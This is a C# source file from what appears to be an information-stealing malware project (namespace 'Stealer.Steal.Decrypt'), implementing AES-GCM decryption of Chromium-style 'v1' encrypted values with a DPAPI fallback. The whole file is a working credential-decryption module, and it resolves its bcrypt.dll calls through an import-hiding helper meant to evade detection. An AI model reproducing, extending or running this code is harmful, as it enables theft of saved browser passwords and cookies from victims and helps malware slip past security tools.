using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Decrypt;

internal class AesGcm
{
	private delegate uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

	private delegate uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

	private delegate uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

	private delegate uint BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

	private delegate uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

	private delegate uint BCryptDestroyKey(IntPtr hKey);

	private delegate uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCrypt.BcryptAuthenticatedCipherModeInfo pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);

	public static byte[] DecryptValue(byte[] source, byte[] key)
	{
		if (Encoding.UTF8.GetString(source, 0, 2) != "v1")
		{
			return DpApi.Decrypt(source)?.ToArray();
		}
		if (key == null)
		{
			return null;
		}
		byte[] iv = source.Skip(3).Take(12).ToArray();
		byte[] authTag = source.Skip(source.Length - 16).ToArray();
		byte[] cipherText = source.Skip(15).Take(source.Length - 15 - 16).ToArray();
		byte[] array = Decrypt(key, iv, cipherText, authTag);
		if (array != null)
		{
			return array;
		}
		return null;
	}

	private static byte[] Decrypt(byte[] key, byte[] iv, byte[] cipherText, byte[] authTag)
	{
		BCryptDecrypt bCryptDecrypt = ImportHider.HiddenCallResolve<BCryptDecrypt>("bcrypt.dll", "BCryptDecrypt");
		BCryptDestroyKey bCryptDestroyKey = ImportHider.HiddenCallResolve<BCryptDestroyKey>("bcrypt.dll", "BCryptDestroyKey");
		BCryptCloseAlgorithmProvider bCryptCloseAlgorithmProvider = ImportHider.HiddenCallResolve<BCryptCloseAlgorithmProvider>("bcrypt.dll", "BCryptCloseAlgorithmProvider");
		IntPtr intPtr = OpenAlgorithmProvider("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
		IntPtr hKey;
		IntPtr hglobal = ImportKey(intPtr, key, out hKey);
		BCrypt.BcryptAuthenticatedCipherModeInfo pPaddingInfo = new BCrypt.BcryptAuthenticatedCipherModeInfo(iv, null, authTag);
		byte[] array2;
		using (pPaddingInfo)
		{
			byte[] array = new byte[MaxAuthTagSize(intPtr)];
			int pcbResult = 0;
			if (bCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, null, 0, ref pcbResult, 0) != 0)
			{
				return null;
			}
			array2 = new byte[pcbResult];
			switch (bCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, array2, array2.Length, ref pcbResult, 0))
			{
			case 3221266434u:
				return null;
			default:
				return null;
			case 0u:
				break;
			}
		}
		bCryptDestroyKey(hKey);
		Marshal.FreeHGlobal(hglobal);
		bCryptCloseAlgorithmProvider(intPtr, 0u);
		return array2;
	}

	private static IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
	{
		BCryptOpenAlgorithmProvider bCryptOpenAlgorithmProvider = ImportHider.HiddenCallResolve<BCryptOpenAlgorithmProvider>("bcrypt.dll", "BCryptOpenAlgorithmProvider");
		BCryptSetProperty bCryptSetProperty = ImportHider.HiddenCallResolve<BCryptSetProperty>("bcrypt.dll", "BCryptSetProperty");
		if (bCryptOpenAlgorithmProvider(out var phAlgorithm, alg, provider, 0u) != 0)
		{
			return phAlgorithm;
		}
		byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
		bCryptSetProperty(phAlgorithm, "ChainingMode", bytes, bytes.Length, 0);
		return phAlgorithm;
	}

	private static int MaxAuthTagSize(IntPtr hAlg)
	{
		byte[] property = GetProperty(hAlg, "AuthTagLength");
		return BitConverter.ToInt32(new byte[4]
		{
			property[4],
			property[5],
			property[6],
			property[7]
		}, 0);
	}

	private static IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
	{
		BCryptImportKey bCryptImportKey = ImportHider.HiddenCallResolve<BCryptImportKey>("bcrypt.dll", "BCryptImportKey");
		int num = BitConverter.ToInt32(GetProperty(hAlg, "ObjectLength"), 0);
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		byte[] array = Concat(BitConverter.GetBytes(1296188491), BitConverter.GetBytes(1), BitConverter.GetBytes(key.Length), key);
		if (bCryptImportKey(hAlg, IntPtr.Zero, "KeyDataBlob", out hKey, intPtr, num, array, array.Length, 0u) == 0)
		{
			return intPtr;
		}
		return IntPtr.Zero;
	}

	private static byte[] GetProperty(IntPtr hAlg, string name)
	{
		BCryptGetProperty bCryptGetProperty = ImportHider.HiddenCallResolve<BCryptGetProperty>("bcrypt.dll", "BCryptGetProperty");
		int pcbResult = 0;
		if (bCryptGetProperty(hAlg, name, null, 0, ref pcbResult, 0u) != 0)
		{
			return null;
		}
		byte[] array = new byte[pcbResult];
		if (bCryptGetProperty(hAlg, name, array, array.Length, ref pcbResult, 0u) == 0)
		{
			return array;
		}
		return null;
	}

	private static byte[] Concat(params byte[][] arrays)
	{
		byte[] array = new byte[arrays.Select((byte[] a) => a.Length).Sum()];
		int num = 0;
		foreach (byte[] array2 in arrays)
		{
			if (array2 != null)
			{
				Buffer.BlockCopy(array2, 0, array, num, array2.Length);
				num += array2.Length;
			}
		}
		return array;
	}
}
